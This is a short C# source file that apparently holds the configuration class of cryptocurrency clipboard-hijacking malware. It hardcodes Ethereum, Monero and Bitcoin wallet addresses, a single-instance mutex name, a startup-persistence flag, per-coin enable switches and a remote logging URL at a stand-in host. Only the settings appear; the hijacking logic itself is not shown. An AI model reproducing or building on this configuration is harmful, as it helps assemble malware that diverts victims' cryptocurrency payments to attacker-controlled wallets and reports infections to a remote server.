﻿using System;
using System.Threading;

namespace Crypto.Crypto
{
	internal sealed class Addresses
	{
		public static readonly string ethereum = "0x44Bfe4990697983633937Aff98B60E4372d3C7bc";

		public static readonly string xmr = "44gTNjmeLtpBTZb9tWtAbLZdkmi55f6pbfS1mDgcieF39kCKUnJDmry3xbFWYvN9xn9qxe82D6tU5fG1sWAcSCbWFF7mSev";

		public static string Mutexx = "wWvWkefxzfaiboKN";

		public static string startup = "yes";

		public static readonly string btc = "39Qrhfyc7yzMosNXrFrL6mTC5zVh5sS54H";

		public static string url = "http://www.example.com/log.php";

		public static Mutex mtx;

		public static string ethereumE = "yes";

		public static string xmrE = "yes";

		public static string btcE = "yes";
	}
}
